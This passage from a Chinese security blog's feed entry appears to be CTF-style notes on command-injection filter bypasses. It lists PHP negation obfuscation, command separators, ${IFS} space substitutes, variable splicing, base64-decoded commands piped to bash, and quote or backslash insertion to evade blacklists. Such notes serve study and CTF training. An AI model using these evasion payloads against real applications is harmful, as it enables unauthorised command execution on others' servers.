title="取反"></a>取反</h2><p>1、二进制的最高位是符号位，0表示正数，1表示附属</p><p>2、正数的原码，反码，补码都是相同</p><p>3、负数的反码=它的原码的符号位不变，其它位取反（0-&gt;1,1-&gt;0）</p><p>4、负数的补码=它的反码+1</p><p>5、0的反码、补码都是0</p><p>6、PHP没有无符号数</p><p>7、在计算机运算的时候，都是以补码的方式来运算，那么运算的结果也是某个数的补码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token double-quoted-string string">"phpinfo"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#%8F%97%8F%96%91%99%90</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h2><p>##通配符</p><p>使用``反引号+”shell”的方式来getshell</p><p>shell下可以利用<code>.</code>来执行任意脚本</p><p><code>.</code>或者叫<code>period</code>，他的作用和<code>source</code>一样，就是用当前的shell执行一个文件中命令。比如，当前运行的shell是bash，则<code>.file</code>的意思就是用bash执行file文件中的命令</p><p>glob通配符</p><p><code>*</code>可以代替0个及以上任意字符</p><p><code>?</code>可以代表一个任意字符</p><p>用<code>[^x]</code>的方法来构造”这个位置不是字符x”</p><p>[0-9]来表示一个范围</p><blockquote><p><a href="https://man7.org/linux/man-pages/man7/glob.7.html">https://man7.org/linux/man-pages/man7/glob.7.html</a></p><p>这里有glob的更多内容</p></blockquote><h1 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h1><h2 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h2><h3 id="1-查看文件"><a href="#1-查看文件" class="headerlink" title="1.查看文件"></a>1.查看文件</h3><table><thead><tr><th>命令</th><th>作用</th></tr></thead><tbody><tr><td>cat</td><td>由第一行开始显示内容，并将所有内容输出</td></tr><tr><td>tac</td><td>从最后一行倒序显示内容，并将所有内容输出</td></tr><tr><td>more</td><td>根据窗口大小，一页一页的显示文件</td></tr><tr><td>less</td><td>和more累死，但是可以往前翻页，而且可以搜索字符</td></tr><tr><td>head</td><td>只显示头几行</td></tr><tr><td>tail</td><td>只显示最后几行</td></tr><tr><td>nl</td><td>累死于cat -n，显示的时候输出行号</td></tr><tr><td>tailf</td><td>类似于tail -f</td></tr><tr><td>od</td><td>读取所给予的文件的内容，并将其内容以八进制的字码显示出来</td></tr><tr><td>sort</td><td>将文件内容排序</td></tr><tr><td>rev</td><td>将文件中的每行内容以字符为单位反序输出</td></tr><tr><td>string</td><td>打印文件中可打印的字符</td></tr><tr><td>cut</td><td>-f 1 filename从文件的每一行剪切字节，字符和字段并将这些字节，字符和字段写至标准输出</td></tr></tbody></table><h3 id="2-查找文件"><a href="#2-查找文件" class="headerlink" title="2.查找文件"></a>2.查找文件</h3><pre class="line-numbers language-none"><code class="language-none">find . -name "fla*"locate fla* locate 命令无需指定路径，直接搜索即可。该命令实在mlocate.db的数据库下搜索，这个数据库位于/var/lib/mlocate/mlocate.db 它包含了系统中所有文件的索引，并且会在每天早上的时候由cron工具自动更新一次，可以sudo updadb更新其数据库which 命令主要用来查询可执行文件的位置whereis 命令会在系统默认安装目录（一般是用root权限时默认安装的软件）查找二进制文件、源码、文档中包含给定查询关键词的文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-寻找文件内容"><a href="#3-寻找文件内容" class="headerlink" title="3.寻找文件内容"></a>3.寻找文件内容</h3><pre class="line-numbers language-none"><code class="language-none">grep -ar fla* /     -a不忽略二进制文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-文件传输"><a href="#4-文件传输" class="headerlink" title="4.文件传输"></a>4.文件传输</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">curl 利用curl下载文件<span class="token shell-comment comment">#使用内置option: -o</span><span class="token shell-comment comment">#curl -o dodo1.jpg http:www.linux.com/dodo1.JPG</span><span class="token shell-comment comment">#使用内置option: -O</span><span class="token shell-comment comment">#curl -O http:</span><span class="token comment">//www.linux.com/dodo1.jpg</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-命令分隔符"><a href="#5-命令分隔符" class="headerlink" title="5.命令分隔符"></a>5.命令分隔符</h3><pre class="line-numbers language-none"><code class="language-none">1.%0a ---&gt;换行符2.%0d ---&gt;回车符3.;符号 再shell中，担任"连续指令"功能的符号就是"分号"4.&amp;符号&amp;放在启动参数后面表示该进程为后台进程，默认情况下，进程是前台进程，这时九八shell给占据了，我们无法进行其他操作，对于那些没有交互的进程，很多时候，我们希望它在后台启动，可以在启动参数的时候加一个'&amp;'实现这个目的，进程切换到后台的时候，我们把它成为job，切换到后台的时候会输出相关job信息5.|符号，管道符左面命令的输出就作为管道符右面命令的输入，所以左边的输出不显示6.&amp;&amp;表示前一条命令执行时，才执行后一条命令7.||表示上一条命令执行失败后，才执行下一条命令8.命令终止符%00 %20 #<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-列目录"><a href="#6-列目录" class="headerlink" title="6.列目录"></a>6.列目录</h3><pre class="line-numbers language-none"><code class="language-none">lsdir<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><p>$IFS在Linux下表示分隔符，单纯的<code>cat$IFS2</code>,bash解释器会把整个IFS2当作变量名，所以导致输出不来结果，然后如果加一个<code>{}</code>就固定了变量名，同理在后面加个<code>$</code>可以起到截断的作用</p><pre class="line-numbers language-none"><code class="language-none">${IFS}$IFS$9&lt;&lt;&gt;{,}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="黑名单过滤"><a href="#黑名单过滤" class="headerlink" title="黑名单过滤"></a>黑名单过滤</h2><h3 id="1-拼接"><a href="#1-拼接" class="headerlink" title="1.拼接"></a>1.拼接</h3><pre class="line-numbers language-none"><code class="language-none">a=c;b=at;c=flag;$a$b $c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-base64编码"><a href="#2-base64编码" class="headerlink" title="2.base64编码"></a>2.base64编码</h3><pre class="line-numbers language-none"><code class="language-none">`echo "Y2F0IGZsYWc="|base64 -d`echo "Y2F0IGZsYWc="|base64 -d|bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-单引号、双引号"><a href="#3-单引号、双引号" class="headerlink" title="3.单引号、双引号"></a>3.单引号、双引号</h3><pre class="line-numbers language-none"><code class="language-none">c""at flagc''at flagca""t fl''ag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>###4.反斜线 \</p><pre class="line-numbers language-none"><code class="language-none">c\at fl\ag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="网络安全" scheme="https://h3h3qaq.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
